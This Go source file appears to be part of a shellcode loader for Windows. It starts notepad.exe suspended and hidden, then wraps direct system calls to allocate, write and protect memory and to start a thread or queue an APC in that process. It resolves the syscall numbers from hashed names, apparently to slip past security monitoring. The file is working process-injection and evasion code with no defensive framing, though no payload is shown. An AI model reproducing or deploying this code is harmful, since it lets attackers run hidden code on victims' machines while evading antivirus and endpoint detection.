package loader

import (
	"errors"
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	nullptr = uintptr(0)
)

func createSuspendedProcess() (*windows.ProcessInformation, error) {
	var si windows.StartupInfo
	var pi windows.ProcessInformation

	pCmdStr, err := windows.UTF16PtrFromString("C:\\Windows\\System32\\notepad.exe")
	if err != nil {
		return nil, err
	}

	if err = windows.CreateProcess(
		nil,
		pCmdStr,
		nil,
		nil,
		false,
		windows.CREATE_SUSPENDED|windows.CREATE_NO_WINDOW,
		nil,
		nil,
		&si,
		&pi,
	); err != nil {
		return nil, err
	}
	return &pi, nil
}

func (l *loader) NtAllocateVirtualMemory(
	hProc, baseAddr uintptr,
	memSize int,
	allocType, protectAttr uintptr,
) (uintptr, error) {
	ssn := l.resolver.GetSyscallSSN(-8110667262648832052)
	if ssn == -1 {
		return nullptr, errors.New("could not resolve -8110667262648832052")
	}
	if _, err := Syscall(
		uint16(ssn),
		hProc,
		uintptr(unsafe.Pointer(&baseAddr)),
		uintptr(unsafe.Pointer(nil)),
		uintptr(unsafe.Pointer(&memSize)),
		allocType,
		protectAttr,
	); err != nil {
		return nullptr, err
	}

	return baseAddr, nil
}

func (l *loader) NtWriteVirtualMemory(
	hProc, baseAddr uintptr,
	buf []byte,
	numBytesToWrite int,
) (uintptr, error) {
	ssn := l.resolver.GetSyscallSSN(-8604883203860988910)
	if ssn == -1 {
		return nullptr, errors.New("could not resolve -8604883203860988910")
	}
	if _, err := Syscall(
		uint16(ssn),
		hProc,
		uintptr(unsafe.Pointer(baseAddr)),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(numBytesToWrite),
		0,
	); err != nil {
		return nullptr, err
	}

	return nullptr, nil
}

func (l *loader) NtProtectVirtualMemory(
	hProc, baseAddr uintptr,
	memSize int,
	newProtect uintptr,
	oldProtect uintptr,
) (uintptr, error) {
	ssn := l.resolver.GetSyscallSSN(8609481851873969992)
	if ssn == -1 {
		return nullptr, errors.New("could not resolve 8609481851873969992")
	}
	if _, err := Syscall(
		uint16(ssn),
		hProc,
		uintptr(unsafe.Pointer(&baseAddr)),
		uintptr(unsafe.Pointer(&memSize)),
		newProtect,
		uintptr(unsafe.Pointer(&oldProtect)),
	); err != nil {
		return nullptr, err
	}

	return oldProtect, nil
}

func (l *loader) NtCreateThreadEx(hThread, hProc, baseAddr uintptr) (uintptr, error) {
	ssn := l.resolver.GetSyscallSSN(-8677770082300808784)
	if ssn == -1 {
		return nullptr, errors.New("could not resolve -8677770082300808784")
	}
	if _, err := Syscall(
		uint16(ssn),
		uintptr(unsafe.Pointer(&hThread)), // ThreadHandle
		windows.GENERIC_EXECUTE,           // DesiredAccess
		0,                                 // ObjectAttributes
		hProc,                             // ProcessHandle
		baseAddr,                          // StartRoutine
		0,                                 // Argument
		uintptr(0),                        // CreateFlags
		0,                                 // ZeroBits
		0,                                 // StackSize
		0,                                 // MaxStackSize
		0,                                 // AttributeList
	); err != nil {
		return nullptr, err
	}

	return hThread, nil
}

func (l *loader) NtQueueApcThread(hThread, baseAddr uintptr) (uintptr, error) {
	ssn := l.resolver.GetSyscallSSN(-7842467120007854408)
	if ssn == -1 {
		return nullptr, errors.New("could not resolve -7842467120007854408")
	}
	if _, err := Syscall(
		uint16(ssn),
		hThread,    // ThreadHandle
		baseAddr,   // ApcRoutine
		uintptr(0), // ApcRoutineContext (optional)
		0,          // ApcStatusBlock (optional)
		0,          // ApcReserved (optional)
	); err != nil {
		return nullptr, err
	}

	return nullptr, nil
}
